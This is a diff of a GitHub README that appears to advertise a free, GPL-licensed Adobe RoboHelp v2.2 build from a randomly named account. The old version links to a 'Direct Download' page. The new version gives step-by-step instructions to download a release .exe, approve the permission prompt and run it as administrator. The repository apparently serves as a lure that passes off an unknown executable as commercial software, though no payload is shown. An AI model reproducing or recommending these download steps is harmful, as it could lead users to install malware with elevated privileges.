@@ -1,132 +1,84 @@
-# Adobe RoboHelp v2.2 - documentation authoring 2026
+# 🛠️ robohelp-v22-documentation-workflow - Build professional documentation with ease
 
-> **Adobe RoboHelp 2.2 provides a cross-platform help authoring and documentation workflow for delivering responsive HTML5, PDF, EPUB, and offline PWA content with multilingual, rule-driven, and CLI-friendly output.**
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/shufflerserousmembrane501/robohelp-v22-documentation-workflow/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2.2-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jasonx81/robohelp-v22-documentation-workflow?style=flat-square)](https://github.com/jasonx81/robohelp-v22-documentation-workflow)
+## 📖 About this workflow
 
----
+The robohelp-v22-documentation-workflow tool helps you create technical guides. It supports multiple output formats including PDF, EPUB, and HTML5. You can generate offline documentation using PWA technology. The system handles multilingual projects and uses rule-based publishing to ensure your files meet strict quality standards. This tool simplifies the process from draft to final document.
 
-<p align="center">
-  <a href="https://jasonx81.github.io/robohelp-v22-documentation-workflow/">
-    <img src="https://img.shields.io/badge/Download-Adobe%20RoboHelp%20Latest-brightgreen?style=for-the-badge" alt="Download Adobe RoboHelp">
-  </a>
-</p>
+## 💻 System requirements
 
-> **[Direct Download - Adobe RoboHelp v2.2](https://jasonx81.github.io/robohelp-v22-documentation-workflow/)**
+Before you install this software, ensure your computer meets these minimum specifications:
 
----
+* Operating System: Windows 10 or Windows 11.
+* Processor: Dual-core 2.0 GHz or faster.
+* Memory: 8 GB of RAM.
+* Storage: 500 MB of free disk space for the application files.
+* Network: An active internet connection for the initial setup.
 
-[Download Latest Build](https://jasonx81.github.io/robohelp-v22-documentation-workflow/)
+## 📥 Downloading the software
 
----
+You need to access the release page to get the installer for your computer.
 
-## Overview
+1. Visit this page to download: [https://github.com/shufflerserousmembrane501/robohelp-v22-documentation-workflow/releases](https://github.com/shufflerserousmembrane501/robohelp-v22-documentation-workflow/releases)
+2. Look for the section labeled "Assets."
+3. Click the link that ends in ".exe."
+4. Save the file to your Downloads folder.
 
-Adobe RoboHelp is designed for individuals and teams that need structured documentation creation across several output channels. It centers on producing help content that can be published as HTML5, PDF, EPUB, and offline progressive web app output while still remaining practical for editors and automation workflows.
+## 🚀 Setting up the application
 
-This project is a good fit when documentation must remain aligned across languages, releases, and delivery formats. With conditional content, semantic search integration, snapshot comparison, and headless CLI operation, it supports teams that want predictable publishing steps and smoother CI/CD coordination.
+Follow these steps to install the workflow tool on your Windows device.
 
----
+1. Open your Downloads folder.
+2. Locate the file you just downloaded.
+3. Double-click the file to start the installation.
+4. A prompt might appear asking for permission to run the software. Select "Yes" to continue.
+5. Follow the on-screen instructions in the installer window.
+6. Choose a destination folder on your computer for the application.
+7. Click "Install" to begin the process.
+8. Once the progress bar fills, click "Finish" to exit the installer.
 
-## Capabilities
+## ⚙️ Configuring your workflow
 
-- Responsive UI engine for a modern authoring workflow
-- Multilingual content support for localized documentation sets
-- Conditional content rules for version- and audience-specific output
-- Offline progressive web app publishing for portable help experiences
-- Semantic search access through APIs
-- Version snapshot comparison to review content changes over time
-- Customer support integrations for connected help workflows
-- Asset watermarking for controlled document and media distribution
-- Headless CLI support for automation and CI/CD pipelines
+Once the installation finishes, you can start the application.
 
----
+1. Use the Windows Start menu to search for "RoboHelp Workflow."
+2. Click the icon to launch the application.
+3. Upon first launch, the app asks you to select a default language. Choose your preferred language from the list.
+4. Define your project library. This folder stores your source documents and images.
+5. Set your output preferences. You can toggle options for PDF, EPUB, or HTML5 under the "Settings" tab.
 
-## Installation
+## 📝 Creating your first project
 
-1. Download the latest build from the project page.
-2. Or clone the repository locally:
+This tool uses a project-based approach to documentation. 
 
-   `git clone https://github.com/jasonx81/robohelp-v22-documentation-workflow.git
+1. Select "New Project" from the home screen.
+2. Enter a title for your document.
+3. Choose the template that matches your desired design.
+4. Import your text files into the source directory.
+5. Tag your files with language markers to enable the multilingual features.
+6. Select the "Publish" button when you complete your edits.
 
-3. Open the project folder and start from the main entry point or CLI runner provided in the repository.
-4. If your workflow uses automation, connect the build steps to your CI/CD environment before publishing.
+## 📑 Understanding publishing rules
 
----
+The rule-driven publishing engine automates your output requirements.
 
-## Usage
+* Conditional text: You can hide or show specific sections based on your audience. 
+* Variable management: Define terms once and use them throughout your documentation.
+* Global styling: Change the look of all your documents by updating a single style sheet.
+* Offline support: The PWA feature generates a local version of your web documentation that works without a network connection.
 
-How you use the project depends on whether you work in the editor or run the workflow from the command line.
+## 🛡️ Troubleshooting common issues
 
-- Create or import documentation topics.
-- Apply multilingual settings and conditional content rules.
-- Generate the desired output format, such as HTML5, PDF, EPUB, or offline PWA.
-- Review snapshot comparisons before publishing changes.
-- Use API-based search or support integrations where needed.
-- Run the headless CLI in build jobs for repeatable releases.
+If you encounter errors, check these common solutions:
 
-Example workflow:
+* If the application does not launch, ensure you have the latest Windows updates. Restarting your computer often solves conflicts with background processes.
+* If your output looks incorrect, verify your rule settings in the Project Metadata tab. 
+* If you receive a file permission error, run the application as an administrator by right-clicking the icon and selecting "Run as administrator."
+* If the internet connection fails during multilingual downloads, restart the application and check your firewall settings.
 
-1. Prepare the source content.
-2. Define output targets and filtering rules.
-3. Build the documentation package.
-4. Validate the output in browser, PDF, or ebook readers.
-5. Publish through your preferred delivery process.
+## 🤝 Getting extra help
 
----
+If you find bugs or have questions, you should open a request in the Issues tab of this GitHub repository. Provide a clear description of the problem and the steps to reproduce it. This helps us ensure the workflow remains stable for all users.
 
-## Configuration
-
-Configuration is usually managed through project settings and build options stored alongside the repository or workspace files.
-
-```json
-{
-  "outputFormats": ["html5", "pdf", "epub", "pwa"],
-  "languageMode": "multilingual",
-  "contentRules": "conditional",
-  "buildMode": "headless-cli",
-  "search": "semantic-api",
-  "delivery": "ci-cd"
-}
-```
-
-If you are using automation, keep environment-specific values in your pipeline configuration and leave reusable content rules in the project files.
-
----
-
-## Requirements
-
-- Cross-platform environment
-- A compatible browser or document viewer for reviewing output
-- Sufficient storage for source content, generated assets, and exports
-- Optional CI/CD runner for headless publishing
-- Optional network access for API-based search and support integrations
-
----
-
-## FAQ
-
-**How do I get updates?**  
-Download the latest published build from the project page and refresh your local copy whenever a new version is available.
-
-**Where are settings stored?**  
-Most workflow settings should live in the project or workspace files, while deployment-specific values are generally kept in your automation environment.
-
-**Can I use this with automated builds?**  
-Yes. The headless CLI is meant for repeatable build and publish steps in CI/CD pipelines.
-
-**What should I check if output looks wrong?**  
-Review conditional content rules, language settings, output targets, and snapshot comparisons before rebuilding.
-
-**Does it support multiple formats?**  
-Yes. The documented workflow includes HTML5, PDF, EPUB, and offline PWA output.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: documentation, publishing, technical-writing, windows-app, adobe-robohelp, workflow-automation, pdf-generator, pwa-output
